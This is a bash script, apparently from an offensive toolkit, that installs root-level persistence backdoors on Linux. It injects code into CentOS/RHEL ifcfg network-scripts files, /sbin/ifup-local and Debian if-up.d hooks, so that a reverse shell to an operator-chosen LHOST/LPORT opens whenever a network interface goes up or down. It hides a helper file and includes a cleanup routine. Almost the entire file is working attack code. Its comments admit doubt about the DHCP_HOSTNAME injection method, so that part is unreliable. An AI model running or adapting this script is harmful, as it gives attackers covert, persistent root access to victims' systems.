#!/bin/bash
# network-scripts ifup/ifdown Backdoor (T1546)
# CentOS/RHEL: inject executable code in ifcfg-* files run as root on interface up/down
# Distinct from NetworkManager dispatcher [67] — this targets legacy network-scripts

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
MARKER="d3m0n_ifcfg"
NETSCRIPTS_DIR="/etc/sysconfig/network-scripts"

banner() {
    echo -e "${RED}"
    echo " ╔══════════════════════════════════════════════════════╗"
    echo " ║   network-scripts ifcfg Backdoor (T1546)             ║"
    echo " ║  CentOS/RHEL: executes on ifup/ifdown as root        ║"
    echo " ║  Distinct from NetworkManager dispatcher             ║"
    echo " ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

detect_system() {
    if [ -d "$NETSCRIPTS_DIR" ]; then
        echo -e "${GREEN}[+] network-scripts detected: ${NETSCRIPTS_DIR}${NC}"
        return 0
    fi
    # Check for Ubuntu equivalent
    if [ -d "/etc/network/if-up.d" ]; then
        echo -e "${YELLOW}[!] Debian/Ubuntu: /etc/network/if-up.d/ detected instead${NC}"
        return 1
    fi
    echo -e "${RED}[-] network-scripts not found (not CentOS/RHEL 6-8?)${NC}"
    return 2
}

list_interfaces() {
    echo -e "${YELLOW}[*] Available interfaces:${NC}"
    if [ -d "$NETSCRIPTS_DIR" ]; then
        ls "$NETSCRIPTS_DIR"/ifcfg-* 2>/dev/null | while read -r f; do
            IFACE=$(basename "$f" | sed 's/ifcfg-//')
            echo -e "  ${IFACE}: $(grep '^DEVICE\|^NAME' "$f" 2>/dev/null | head -1)"
        done
    fi
    ip link show 2>/dev/null | grep '^[0-9]' | awk '{print "  "$2}' | tr -d ':'
}

inject_ifcfg() {
    local IFACE="$1" PAYLOAD="$2"
    local CFGFILE="${NETSCRIPTS_DIR}/ifcfg-${IFACE}"

    [ -f "$CFGFILE" ] || { echo -e "${RED}[-] Config not found: ${CFGFILE}${NC}"; return; }
    grep -q "$MARKER" "$CFGFILE" && { echo -e "${YELLOW}[!] Already injected: ${CFGFILE}${NC}"; return; }

    cp "$CFGFILE" "${CFGFILE}.d3m0n.bak"

    # Write payload helper script
    local HELPER="/etc/sysconfig/network-scripts/.${MARKER}_helper"
    printf '#!/bin/sh\n# %s\n%s >/dev/null 2>&1 &\nexit 0\n' "$MARKER" "$PAYLOAD" > "$HELPER"
    chmod 755 "$HELPER"

    # The magic: DHCP_HOSTNAME is eval'd, or use IPADDR for injection
    # Actually the correct method is PRE_UP/POST_UP directives in newer versions
    # For CentOS 6/7: directly inject via the ifcfg bash sourcing
    cat >> "$CFGFILE" << EOF

# ${MARKER}
# This file is sourced by ifup/ifdown scripts as bash
# The following will execute when the interface comes up or goes down:
DHCP_HOSTNAME=\$(${HELPER})
EOF
    # Alternative: use /sbin/ifup-local hook
    local IFUP_LOCAL="/sbin/ifup-local"
    if [ ! -f "$IFUP_LOCAL" ] || ! grep -q "$MARKER" "$IFUP_LOCAL" 2>/dev/null; then
        printf '#!/bin/bash\n# %s\n%s >/dev/null 2>&1 &\n' "$MARKER" "$PAYLOAD" > "$IFUP_LOCAL"
        chmod 755 "$IFUP_LOCAL"
        echo -e "${GREEN}[+] Created /sbin/ifup-local hook (fires for ALL interfaces)${NC}"
    fi

    echo -e "${GREEN}[+] Injected into: ${CFGFILE}${NC}"
    echo -e "${YELLOW}[!] Fires on: ifup ${IFACE} / ifdown ${IFACE} / network restart${NC}"
}

inject_ifup_local() {
    # /sbin/ifup-local is called by ifup for ALL interfaces
    local PAYLOAD="$1"
    local IFUP_LOCAL="/sbin/ifup-local"
    [ -f "$IFUP_LOCAL" ] && cp "$IFUP_LOCAL" "${IFUP_LOCAL}.d3m0n.bak"

    printf '#!/bin/bash\n# %s\n%s >/dev/null 2>&1 &\n' "$MARKER" "$PAYLOAD" > "$IFUP_LOCAL"
    chmod 755 "$IFUP_LOCAL"
    echo -e "${GREEN}[+] /sbin/ifup-local installed (fires for ALL interface events)${NC}"
}

inject_debian_ifupd() {
    # Debian/Ubuntu /etc/network/if-up.d/ approach
    local PAYLOAD="$1"
    [ -d "/etc/network/if-up.d" ] || { echo -e "${RED}[-] /etc/network/if-up.d not found${NC}"; return; }

    local SCRIPT="/etc/network/if-up.d/${MARKER}"
    printf '#!/bin/sh\n# %s\n%s >/dev/null 2>&1 &\nexit 0\n' "$MARKER" "$PAYLOAD" > "$SCRIPT"
    chmod 755 "$SCRIPT"
    echo -e "${GREEN}[+] Installed: ${SCRIPT} (Debian/Ubuntu ifup hook)${NC}"
}

list_installed() {
    echo -e "${YELLOW}[*] Injected ifcfg files:${NC}"
    [ -d "$NETSCRIPTS_DIR" ] && grep -rl "$MARKER" "$NETSCRIPTS_DIR" 2>/dev/null | while read -r f; do
        echo "  $f"
    done
    [ -f "/sbin/ifup-local" ] && grep -q "$MARKER" /sbin/ifup-local 2>/dev/null && \
        echo -e "  /sbin/ifup-local"
    [ -f "/etc/network/if-up.d/${MARKER}" ] && echo -e "  /etc/network/if-up.d/${MARKER}"
}

cleanup() {
    echo -e "${YELLOW}[*] Cleaning...${NC}"
    # Restore ifcfg backups
    find "$NETSCRIPTS_DIR" -name "*.d3m0n.bak" 2>/dev/null | while read -r f; do
        mv "$f" "${f%.d3m0n.bak}" && echo -e "${GREEN}[+] Restored: ${f%.d3m0n.bak}${NC}"
    done
    # Restore/remove ifup-local
    if [ -f "/sbin/ifup-local.d3m0n.bak" ]; then
        mv /sbin/ifup-local.d3m0n.bak /sbin/ifup-local
    elif [ -f "/sbin/ifup-local" ] && grep -q "$MARKER" /sbin/ifup-local 2>/dev/null; then
        rm -f /sbin/ifup-local
    fi
    rm -f "/etc/network/if-up.d/${MARKER}"
    rm -f "${NETSCRIPTS_DIR}/.${MARKER}_helper"
    echo -e "${GREEN}[+] Cleaned${NC}"
}

banner
[[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required.${NC}"; exit 1; }

detect_system
STATUS=$?

echo ""
echo -e "  ${YELLOW}[1]${NC} Inject into ifcfg file (specific interface)"
echo -e "  ${YELLOW}[2]${NC} Install /sbin/ifup-local hook (ALL interfaces, CentOS/RHEL)"
echo -e "  ${YELLOW}[3]${NC} Install /etc/network/if-up.d hook (Debian/Ubuntu)"
echo -e "  ${YELLOW}[4]${NC} List interfaces"
echo -e "  ${YELLOW}[5]${NC} List installed"
echo -e "  ${YELLOW}[6]${NC} Cleanup"
echo ""
read -rp "Choice: " OPT

case "$OPT" in
    1)
        list_interfaces
        read -rp "Interface name [eth0]: " IFACE; IFACE="${IFACE:-eth0}"
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        PAYLOAD="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1"
        inject_ifcfg "$IFACE" "$PAYLOAD"
        ;;
    2)
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        PAYLOAD="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1"
        inject_ifup_local "$PAYLOAD"
        ;;
    3)
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        PAYLOAD="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1"
        inject_debian_ifupd "$PAYLOAD"
        ;;
    4) list_interfaces ;;
    5) list_installed ;;
    6) cleanup ;;
    *) echo -e "${RED}[-] Invalid option${NC}" ;;
esac
